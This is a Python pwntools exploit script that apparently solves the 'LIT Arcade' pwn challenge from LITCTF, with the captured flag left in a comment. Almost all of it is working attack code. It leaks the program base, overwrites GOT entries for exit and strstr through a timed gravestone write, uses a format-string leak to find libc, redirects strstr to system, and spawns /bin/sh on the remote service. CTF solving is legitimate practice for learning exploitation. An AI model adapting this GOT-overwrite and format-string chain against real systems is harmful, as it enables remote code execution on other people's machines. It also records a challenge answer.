#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./main_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

REMOTE_NC_CMD    = "nc litctf.org 31773"    # `nc <host> <port>`
#REMOTE_NC_CMD    = "nc localhost 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *checkGrid
b *toggleRow
c
"""

#b *loseFuse+164

def conn():
    if args.LOCAL:
        return process([exe.path], env={"LD_PRELOAD":"./libgcc_s.so.1"})
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT, env={"LD_PRELOAD":"./libgcc_s.so.1"})
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()
    #pause()
    
    r.sendline(b"9")
    r.recvuntil(b"premise")
    r.sendline(b"TIL")
    r.recvuntil(b">")
    r.sendline(b"8")
    r.recvuntil(b"score: ")
    exe.address = int(r.recvline(False)) - exe.sym.newMinigame

    log.info(f"BIN @ {hex(exe.address)}")

    r.sendline(b"3")
    
    sleep(10)
    r.send(p64(exe.got.exit))

    r.recvuntil(b"Enter name for your gravestone: ")
    r.send(p64(exe.sym.main)+p64(exe.address+0x1190)[:-1])
    r.recvuntil(b"Enter text for your gravestone: ")
    r.send(p64(exe.sym.main)+p64(exe.address+0x1190)[:-1])

    log.info("Exit overwritten and returning to main...")

    r.sendline(b"3")
    r.recvuntil(b"You have 10 seconds")

    sleep(10)
    log.info("Overwriting strstr...")
    
    r.send(p64(exe.got.strstr))

    r.recvuntil(b"Enter name for your gravestone: ")
    r.send(p64(exe.plt.printf)+p64(exe.address+0x11b0)[:-1])
    r.recvuntil(b"Enter text for your gravestone: ")
    r.send(p64(exe.plt.printf)+p64(exe.address+0x11b0)[:-1])

    r.recvuntil(b"Welcome to LIT Arcade!")

    r.sendline(b"9")
    r.recvuntil(b"What is the premise of your minigame?")
    r.sendline(b"%3$p")
    r.recvuntil(b"proposal.\n")
    libc.address = int(r.recvuntil(b"-")[:-1], 16) - libc.sym.write-79
    log.info(f"LIBC @ {hex(libc.address)}")
    
    log.info("Last overwrite...")

    r.sendline(b"3")
    r.recvuntil(b"You have 10 seconds")
    
    sleep(10)
    r.send(p64(exe.got.strstr))

    r.recvuntil(b"Enter name for your gravestone: ")
    r.send(p64(libc.sym.system))
    r.recvuntil(b"Enter text for your gravestone: ")
    r.send(p64(libc.sym.system))

    r.recvuntil(b"Welcome to LIT Arcade!")

    r.sendline(b"9")
    r.recvuntil(b"What is the premise of your minigame?")
    r.sendline(b"/bin/sh\0")

    r.interactive()
    #LITCTF{0h_why_mu57_7hr34d1ng_b3_50_d1ff1cul7_4ls0_d0_n0t_f0rg37_7o_wr1t3_r37urn_v4lu35_bd5aa3a7}

if __name__ == "__main__":
    while True:
        main()